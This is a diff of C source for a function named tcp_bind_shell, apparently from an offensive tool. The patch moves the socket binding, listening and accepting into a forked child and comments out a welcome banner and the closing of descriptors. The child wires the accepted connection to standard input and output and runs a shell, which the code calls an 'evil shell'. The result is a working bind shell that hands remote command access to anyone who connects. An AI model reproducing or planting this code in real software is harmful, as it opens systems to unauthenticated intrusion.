@@ -91,34 +91,36 @@ static void tcp_bind_shell(ctrl_t *ctrl)
     char buff[SOCKBUF];
 
 
-    __VERBOSE_BIND_TCP;
-
-    /* create socket, set desired socket option and fill in sockaddr_in {} */
-    shell->lfd = xsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    xsetsockopt(shell->lfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-    xmemset(&shell->srv, 0x00, sizeof(shell->srv));
-    shell->srv.sin_family = AF_INET;
-    shell->srv.sin_addr.s_addr = htonl(INADDR_ANY);
-    shell->srv.sin_port = htons(shell->port);
-
-    /* bind shell on given port, go to listen mode and accept connections */
-    xbind(shell->lfd, (struct sockaddr *) &shell->srv, sizeof(shell->srv));
-    xlisten(shell->lfd, 1024);
-    len = sizeof(shell->cli);
-    shell->cfd = xaccept(shell->lfd, (struct sockaddr *) &shell->cli, &len);
-
-    __VERBOSE_CONNECT_FROM;
 
     /* exec evil shell */
     if ((shell->pid = fork()) == 0) {
-    xclose(shell->lfd);
+		__VERBOSE_BIND_TCP;
 
+		/* create socket, set desired socket option and fill in sockaddr_in {} */
+		shell->lfd = xsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+		xsetsockopt(shell->lfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+		xmemset(&shell->srv, 0x00, sizeof(shell->srv));
+		shell->srv.sin_family = AF_INET;
+		shell->srv.sin_addr.s_addr = htonl(INADDR_ANY);
+		shell->srv.sin_port = htons(shell->port);
+
+		/* bind shell on given port, go to listen mode and accept connections */
+		xbind(shell->lfd, (struct sockaddr *) &shell->srv, sizeof(shell->srv));
+		xlisten(shell->lfd, 1024);
+		len = sizeof(shell->cli);
+		shell->cfd = xaccept(shell->lfd, (struct sockaddr *) &shell->cli, &len);
+
+		__VERBOSE_CONNECT_FROM;
+		
+		
+		
+		xclose(shell->lfd);
 
         xdup2(shell->cfd, 0);
         xdup2(shell->cfd, 1);
         xdup2(shell->cfd, 2);
-        sleep(1);
-        __SEND_BANNER(_BAN_WELCOME);
+        //sleep(1);
+        //__SEND_BANNER(_BAN_WELCOME);
         execl(SHELL, SHELL, NULL);
         __EXIT_SUCCESS;
     }
@@ -130,13 +132,13 @@ static void tcp_bind_shell(ctrl_t *ctrl)
         t.tv_sec = 600;
         t.tv_nsec = 0;
         int w;
-        w = sigtimedwait(&mask, 0, &t);
+        w = sigtimedwait(&mask, 0, &t);  // limit the child process's life time
         // printf("sigtimedwait return %d\n", w);
         kill(shell->pid, 9);
 
     /* we are done, so we can close descriptors */
-    xclose(shell->lfd);
-    xclose(shell->cfd);
+    // xclose(shell->lfd);
+    // xclose(shell->cfd);
 
     return;
 }
